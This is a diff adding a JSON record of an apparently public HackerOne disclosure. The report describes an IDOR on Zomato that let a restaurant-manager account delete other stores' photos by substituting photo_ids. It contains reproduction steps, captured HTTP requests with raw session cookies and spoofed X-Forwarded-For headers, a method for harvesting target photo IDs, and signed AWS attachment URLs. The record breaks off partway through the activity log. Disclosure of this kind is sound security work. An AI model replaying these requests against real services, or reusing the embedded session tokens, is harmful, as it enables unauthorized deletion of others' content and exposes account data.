@@ -1,0 +1,511 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-09-05T15:11:33.350Z", 
+    "voters": [
+        "shivasurya", 
+        "miguel_santareno", 
+        "spam404", 
+        "mik317", 
+        "emitrani", 
+        "flashdisk", 
+        "eveeez", 
+        "ischleep", 
+        "an0nym0us", 
+        "generaleg", 
+        "and 26 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "600.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 404797, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-09-05T17:01:23.591Z", 
+    "vulnerability_information": "**Summary:** The parameter `photo_ids` in below request is vulnerable to IDOR\n\n/php/client_manage_handler?\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&case=remove-active-photo\n\n**Description:** Since there is no check for res_id or ownership I was able to delete Gerben's image by just using the photo_id from his store. This is a problem because it is a get request and I can try a bunch of ID's to randomly delete photos that don't belong to me or try to find a way to leak this ID from store page to do targeted deletes. \n\nI believe if you try to delete multiple photos there will be more ids in the request so that would allow to expand the attack by trying a lot of ids at once.\n\n**Platform(s) Affected:** [website]\n\n\n## Steps To Reproduce:\n\n\n  1. Get 2 stores.\n  2. With store 1 navigate to https://www.zomato.com/clients/manage_photos.php\n  3. Start to delete a photo and capture the request that looks like :\n\n```\nGET /php/client_manage_handler?\u2588\u2588\u2588&case=remove-active-photo HTTP/1.1\nHost: www.zomato.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://www.zomato.com/\nX-Requested-With: XMLHttpRequest\nCookie: _ga=GA1.2.2082511252.1535917423; _gid=GA1.2.1587734047.1535917423; PHPSESSID=4821c7caf69f3253db3be3d4c42a15b7b04d223a; fbcity=283; zl=en; fbtrack=a09417c27b7e98b4b3f2ad8357ef3903; __utmx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:NaN; __utmxx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:1535944804:8035200; dpr=2; cto_lwid=82057293-9985-419b-a25b-4d8b6d89951b; G_ENABLED_IDPS=google; zhli=1; squeeze=cd186e1f53eee0d94e51ef00c9d4eb25; orange=2769113; al=1; session_id=null\nConnection: close\nX-Forwarded-For: 127.0.0.1\n\n```\n\n4 . Save the photo_ids parameter\n5 . Go to your second restaurant account and capture the same request with a different res_id and cookies\n6 . Replace the `photo_ids` with the id from step 4 and send request.\n7 . Observe the photo is deleted.\n\n## Impact\n\nBy using targeted or blind attacks it is possible to delete photos that don't belong to a restaurant because of this IDOR. My leading theory is that currently you are checking that the logged in user has permissions on the res_id in the request but not verifying that the res_id owns that photograph. There should be an additional check to ensure that the photo_id belongs to that restaurant before deleting it.\n\nRegards,\nEray", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "low", 
+        "author_type": "Team"
+    }, 
+    "title": "IDOR to delete images from other stores", 
+    "is_member_of_team?": null, 
+    "vote_count": 36, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_view?": true, 
+            "can_edit?": false, 
+            "id": 10261, 
+            "content": "When I was testing the restaurant manager specific endpoints on Zomato I discovered that pictures added were being deleted with a get request like so:\n\n```\nGET /php/client_manage_handler?res_id=REDACTED&photo_ids%5B%5D=r_YxNDUOTE4MTYzO&removable=1&case=remove-active-photo HTTP/1.1\nHost: www.zomato.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://www.zomato.com/\nX-Requested-With: XMLHttpRequest\nCookie: REDACTED\nConnection: close\n```\n`photo_ids` seemed like a potential IDOR and I found it was possible to find the ID by visiting a restaurants front page. Since I didn't want to delete a photo in production I decided to contact someone who I knew also had access to a manager account to test my intuition. As I had no way of seeing if his private picture was deleted I waited for his response and then submitted my report with the following POC:\n\n{F341857}\n\n@Zomato team promptly verified and fixed the issue and it was a pleasure to work with them for the first time.\n", 
+            "content_html": "<p>When I was testing the restaurant manager specific endpoints on Zomato I discovered that pictures added were being deleted with a get request like so:</p>\n<pre class=\"highlight plaintext\"><code>GET /php/client_manage_handler?res_id=REDACTED&amp;photo_ids%5B%5D=r_YxNDUOTE4MTYzO&amp;removable=1&amp;case=remove-active-photo HTTP/1.1\nHost: www.zomato.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://www.zomato.com/\nX-Requested-With: XMLHttpRequest\nCookie: REDACTED\nConnection: close\n</code></pre>\n<p><code>photo_ids</code> seemed like a potential IDOR and I found it was possible to find the ID by visiting a restaurants front page. Since I didn&#39;t want to delete a photo in production I decided to contact someone who I knew also had access to a manager account to test my intuition. As I had no way of seeing if his private picture was deleted I waited for his response and then submitted my report with the following POC:</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"proof.JPG\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/341/857/b4979640c930d4180787b1963665149d0f361784/proof.JPG?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221714Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=b90b9fad89b3c9e24c9c7ad2f2f9f35bd3514547e29ef23f6e9bb8dae106bf17\" data-attachment-type=\"image/jpeg\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/341/857/b4979640c930d4180787b1963665149d0f361784/proof.JPG?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221714Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=b90b9fad89b3c9e24c9c7ad2f2f9f35bd3514547e29ef23f6e9bb8dae106bf17\" class=\"markdown-inline-image\"></a></p>\n\n<p><a href=\"/zomato\">@Zomato</a> team promptly verified and fixed the issue and it was a pleasure to work with them for the first time.</p>\n"
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "*.zomato.com", 
+        "max_severity": "critical", 
+        "databaseId": 383, 
+        "asset_type": "URL"
+    }, 
+    "allow_singular_disclosure_at": null, 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$600", 
+    "singular_disclosure_disabled": true, 
+    "activities": [
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/341/857/b4979640c930d4180787b1963665149d0f361784/proof.JPG?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221713Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7508a8eb9094b2c1c5522431af182bd0d91656ee0e68ba4fa75fdb8a69dbdf96", 
+                    "type": "image/jpeg", 
+                    "id": 341857, 
+                    "filename": "proof.JPG"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2018-09-03T16:45:24.790Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-03T16:45:24.790Z", 
+            "actor": {
+                "username": "emitrani", 
+                "url": "/emitrani", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/206/181/d9825aec6bc5bb13768b86c22d02a6fc7f42842b_medium.PNG?1528334442"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "zomato", 
+            "message": "POC:\n\n{F341857}", 
+            "markdown_message": "<p>POC:</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"proof.JPG\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/341/857/b4979640c930d4180787b1963665149d0f361784/proof.JPG?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221713Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=7508a8eb9094b2c1c5522431af182bd0d91656ee0e68ba4fa75fdb8a69dbdf96\" data-attachment-type=\"image/jpeg\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/341/857/b4979640c930d4180787b1963665149d0f361784/proof.JPG?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221713Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=7508a8eb9094b2c1c5522431af182bd0d91656ee0e68ba4fa75fdb8a69dbdf96\" class=\"markdown-inline-image\"></a></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3286156, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-03T16:54:54.956Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-03T16:54:54.956Z", 
+            "actor": {
+                "username": "prateek_0490-zomato", 
+                "url": "/prateek_0490-zomato", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/250/599/51a304a7bad58ad6f5fefcada5ae92b8b93168ce_medium.png?1521371856"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "zomato", 
+            "message": "Hi @emitrani,\n\nThank you for your submission. We are investigating your report, and will let you know if we have any questions. We appreciate your assistance and cooperation.", 
+            "markdown_message": "<p>Hi <a href=\"/emitrani\">@emitrani</a>,</p>\n\n<p>Thank you for your submission. We are investigating your report, and will let you know if we have any questions. We appreciate your assistance and cooperation.</p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 3286175, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-03T16:55:04.079Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-03T16:55:04.079Z", 
+            "actor": {
+                "username": "prateek_0490-zomato", 
+                "url": "/prateek_0490-zomato", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/250/599/51a304a7bad58ad6f5fefcada5ae92b8b93168ce_medium.png?1521371856"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "Low", 
+                "old_severity": "Medium"
+            }, 
+            "team_handle": "zomato", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 3286176, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-03T19:11:17.089Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-03T19:13:52.878Z", 
+            "actor": {
+                "username": "emitrani", 
+                "url": "/emitrani", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/206/181/d9825aec6bc5bb13768b86c22d02a6fc7f42842b_medium.PNG?1528334442"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "zomato", 
+            "message": "Hi @prateek_0490-zomato,\n\nI found a way to get the photo_id from restaurants to do targeted deleting of photos. I believe in light of this information you might reconsider the severity as only prerequisite to perform this attack becomes owning a restaurant manager account.\n\nIf you go to a restaurant page like https://www.zomato.com/washington-dc/old-ebbitt-grill-downtown and click `All photos` and intercept the request you will see the following:\n\n```\nPOST //php/photoviewerData.php HTTP/1.1\nHost: www.zomato.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://www.zomato.com/\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 384\nCookie: _ga=GA1.2.2082511252.1535917423; _gid=GA1.2.1587734047.1535917423; PHPSESSID=9989b21f95f2ab2f41f11ec304f6ac58f2c445f4; fbcity=283; zl=en; fbtrack=a09417c27b7e98b4b3f2ad8357ef3903; __utmx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:NaN; __utmxx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:1536001591:8035200; dpr=2; cto_lwid=82057293-9985-419b-a25b-4d8b6d89951b; G_ENABLED_IDPS=google; zhli=1; squeeze=427c02f9f422eb1ca8fd81723c912253; orange=4411464; al=1; session_id=null; csrf=cd01d3d66835a75f5588852cf26e26d4; ak_bmsc=311D3563BCBA40C5DE755ACA53DC87B4B81C11952E6F00000F868D5B7834CA25~pllXy4xKhsB6DdsDwY8KYOHpXwOkLLHZbn56SG9EI0T5FaEGmiI8C+T9b65LICM+C4OMSgfQfx+VnBdzdQ9Ik08Ns7GzhnXsFhBdcX+NAlaa1oEoH77wHYEa/XFNwmuoX4hH9gF30/pt9nGUvDWhqkplkpIgGNiPMQGMy/lJ3wwrngS6yPYpJbpcbpwPKDJRxrP50xMVVmBTkPWrLCLdWB8Izo3j3WTrfj4iLXHK7wMhM=; LEL_JS=true; bm_sv=3D12D8CA594927210BEA1A7E276CF8C2~ijgWzSmJx+1gIjjBTZB9Fb60dSMUdE+oQmtZ29nwYqRUFbO3Kz9+MMRSD4Iu5j7pZf5mB2Vq4uV7SPqLLUiGFqsujq2n5Oxbju2sGWmhTDjpWQ7x7sI6gOwI0FQr6BPh22qhaP/D+6+0fNutGhlxHr6lAro/aXJjqCoO9wMdH0c=; AMP_TOKEN=%24NOT_FOUND\nConnection: close\nX-Forwarded-For: 127.0.0.1\n\nphotoviewersize=NORMAL&photo_id=u_1MDU1NjE2NzE5M&type=res&index=1&category=all&res_id=16872578&group_id=false&onPage=true&moreToFetch%5B%5D=0&moreToFetch%5B%5D=1&moreToFetch%5B%5D=2&moreToFetch%5B%5D=3&moreToFetch%5B%5D=4&moreToFetch%5B%5D=5&moreToFetch%5B%5D=6&moreToFetch%5B%5D=7&moreToFetch%5B%5D=8&moreToFetch%5B%5D=9&moreToFetch%5B%5D=10&moreToFetch%5B%5D=11&moreToFetch%5B%5D=12\n```\n\nWhere `photo_id` parameter can be used to delete said photo. Might have to change the u_ to r_ but I'm not sure as I didn't try to delete a photo in production.\n\nRegards,\nEray ", 
+            "markdown_message": "<p>Hi <a href=\"/prateek_0490-zomato\">@prateek_0490-zomato</a>,</p>\n\n<p>I found a way to get the photo_id from restaurants to do targeted deleting of photos. I believe in light of this information you might reconsider the severity as only prerequisite to perform this attack becomes owning a restaurant manager account.</p>\n\n<p>If you go to a restaurant page like <a title=\"https://www.zomato.com/washington-dc/old-ebbitt-grill-downtown\" href=\"/redirect?signature=127e79008917de8a74b3efd3b2b3090f03a06fff&amp;url=https%3A%2F%2Fwww.zomato.com%2Fwashington-dc%2Fold-ebbitt-grill-downtown\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.zomato.com/washington-dc/old-ebbitt-grill-downtown</span><i class=\"icon-external-link\"></i></a> and click <code>All photos</code> and intercept the request you will see the following:</p>\n<pre class=\"highlight plaintext\"><code>POST //php/photoviewerData.php HTTP/1.1\nHost: www.zomato.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://www.zomato.com/\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 384\nCookie: _ga=GA1.2.2082511252.1535917423; _gid=GA1.2.1587734047.1535917423; PHPSESSID=9989b21f95f2ab2f41f11ec304f6ac58f2c445f4; fbcity=283; zl=en; fbtrack=a09417c27b7e98b4b3f2ad8357ef3903; __utmx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:NaN; __utmxx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:1536001591:8035200; dpr=2; cto_lwid=82057293-9985-419b-a25b-4d8b6d89951b; G_ENABLED_IDPS=google; zhli=1; squeeze=427c02f9f422eb1ca8fd81723c912253; orange=4411464; al=1; session_id=null; csrf=cd01d3d66835a75f5588852cf26e26d4; ak_bmsc=311D3563BCBA40C5DE755ACA53DC87B4B81C11952E6F00000F868D5B7834CA25~pllXy4xKhsB6DdsDwY8KYOHpXwOkLLHZbn56SG9EI0T5FaEGmiI8C+T9b65LICM+C4OMSgfQfx+VnBdzdQ9Ik08Ns7GzhnXsFhBdcX+NAlaa1oEoH77wHYEa/XFNwmuoX4hH9gF30/pt9nGUvDWhqkplkpIgGNiPMQGMy/lJ3wwrngS6yPYpJbpcbpwPKDJRxrP50xMVVmBTkPWrLCLdWB8Izo3j3WTrfj4iLXHK7wMhM=; LEL_JS=true; bm_sv=3D12D8CA594927210BEA1A7E276CF8C2~ijgWzSmJx+1gIjjBTZB9Fb60dSMUdE+oQmtZ29nwYqRUFbO3Kz9+MMRSD4Iu5j7pZf5mB2Vq4uV7SPqLLUiGFqsujq2n5Oxbju2sGWmhTDjpWQ7x7sI6gOwI0FQr6BPh22qhaP/D+6+0fNutGhlxHr6lAro/aXJjqCoO9wMdH0c=; AMP_TOKEN=%24NOT_FOUND\nConnection: close\nX-Forwarded-For: 127.0.0.1\n\nphotoviewersize=NORMAL&amp;photo_id=u_1MDU1NjE2NzE5M&amp;type=res&amp;index=1&amp;category=all&amp;res_id=16872578&amp;group_id=false&amp;onPage=true&amp;moreToFetch%5B%5D=0&amp;moreToFetch%5B%5D=1&amp;moreToFetch%5B%5D=2&amp;moreToFetch%5B%5D=3&amp;moreToFetch%5B%5D=4&amp;moreToFetch%5B%5D=5&amp;moreToFetch%5B%5D=6&amp;moreToFetch%5B%5D=7&amp;moreToFetch%5B%5D=8&amp;moreToFetch%5B%5D=9&amp;moreToFetch%5B%5D=10&amp;moreToFetch%5B%5D=11&amp;moreToFetch%5B%5D=12\n</code></pre>\n<p>Where <code>photo_id</code> parameter can be used to delete said photo. Might have to change the u_ to r_ but I&#39;m not sure as I didn&#39;t try to delete a photo in production.</p>\n\n<p>Regards,<br>\nEray </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3286429, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-03T19:53:12.505Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-05T16:59:29.993Z", 
+            "actor": {
+                "username": "prateek_0490-zomato", 
+                "url": "/prateek_0490-zomato", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/250/599/51a304a7bad58ad6f5fefcada5ae92b8b93168ce_medium.png?1521371856"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "zomato", 
+            "message": "@emitrani One has to be a restaurant manager is itself a bit of task to perform this action. \n\nAre you able to delete User's Posted Images too? Like can you delete this?\n\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\nThanks.", 
+            "markdown_message": "<p><a href=\"/emitrani\">@emitrani</a> One has to be a restaurant manager is itself a bit of task to perform this action. </p>\n\n<p>Are you able to delete User&#39;s Posted Images too? Like can you delete this?</p>\n\n<p>\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588</p>\n\n<p>Thanks.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3286511, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-03T20:05:13.902Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-05T16:58:35.910Z", 
+            "actor": {
+                "username": "emitrani", 
+                "url": "/emitrani", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/206/181/d9825aec6bc5bb13768b86c22d02a6fc7f42842b_medium.PNG?1528334442"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "zomato", 
+            "message": "I think I can only delete photos starting with r_ as in posted by restaurant but I'm not entirely sure. I got a success response back so it might take some time to be removed from s3. \n\nI checked I can only delete something with r_. I can show it with that photo\n\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588", 
+            "markdown_message": "<p>I think I can only delete photos starting with r_ as in posted by restaurant but I&#39;m not entirely sure. I got a success response back so it might take some time to be removed from s3. </p>\n\n<p>I checked I can only delete something with r_. I can show it with that photo</p>\n\n<p>\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3286535, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-03T20:07:24.535Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-03T20:07:24.535Z", 
+            "actor": {
+                "username": "prateek_0490-zomato", 
+                "url": "/prateek_0490-zomato", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/250/599/51a304a7bad58ad6f5fefcada5ae92b8b93168ce_medium.png?1521371856"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "zomato", 
